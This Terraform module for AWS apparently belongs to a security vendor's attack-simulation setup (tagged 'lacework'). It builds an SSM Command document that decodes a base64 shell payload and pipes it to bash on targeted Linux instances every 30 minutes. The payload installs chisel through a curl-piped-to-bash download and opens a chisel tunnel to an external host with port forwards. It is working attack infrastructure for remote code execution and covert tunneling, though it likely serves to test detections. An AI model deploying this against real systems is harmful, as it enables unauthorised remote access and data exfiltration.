locals {
    host_ip = var.host_ip
    host_port = var.host_port
    #9001:www.exploit-db.com:443
    port_forwards = join(" ", [
        for port in var.port_forwards: "${port.src_port}:${port.dst_ip}:${port.dst_port}"
    ])
    payload = <<-EOT
    LOGFILE=/tmp/attacker_exec_port_forward.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    truncate -s 0 $LOGFILE
    killall -9 chisel
    truncate -s 0 /tmp/chisel.log
    log "checking for chisel..."
    while ! which chisel; do
        log "chisel not found - installing"
        curl https://i.jpillora.com/chisel! | bash
        sleep 10
    done
    log "chisel: $(which chisel)"
    /usr/local/bin/chisel client -v ${local.host_ip}:${local.host_port} ${local.port_forwards} > /tmp/chisel.log 2>&1 &
    log "waiting 10 minutes..."
    sleep 600
    log "wait done - terminating"
    killall -9 chisel
    log "done"
    EOT
    base64_payload = base64encode(local.payload)
}

resource "aws_ssm_document" "exec_port_forward_target" {
  name          = "exec_port_forward_target"
  document_type = "Command"

  content = jsonencode(
    {
        "schemaVersion": "2.2",
        "description": "deploy port forward",
        "mainSteps": [
            {
                "action": "aws:runShellScript",
                "name": "exec_port_forward_target",
                "precondition": {
                    "StringEquals": [
                        "platformType",
                        "Linux"
                    ]
                },
                "inputs": {
                    "timeoutSeconds": "1200",
                    "runCommand": [
                        "echo \"${local.base64_payload}\" > /tmp/payload_${basename(abspath(path.module))}",
                        "echo '${local.base64_payload}' | base64 -d | /bin/bash -"
                    ]
                }
            }
        ]
    })
}

resource "aws_resourcegroups_group" "exec_port_forward_target" {
    name = "exec_port_forward_target"

    resource_query {
        query = jsonencode(var.resource_query_exec_port_forward_target)
    }

    tags = {
        billing = var.environment
        owner   = "lacework"
    }
}

resource "aws_ssm_association" "exec_port_forward_target" {
    association_name = "exec_port_forward_target"

    name = aws_ssm_document.exec_port_forward_target.name

    targets {
        key = "resource-groups:Name"
        values = [
            aws_resourcegroups_group.exec_port_forward_target.name,
        ]
    }

    compliance_severity = "HIGH"

    # every 30 minutes
    schedule_expression = "cron(0/30 * * * ? *)"
    
    # will apply when updated and interval when false
    apply_only_at_cron_interval = false
}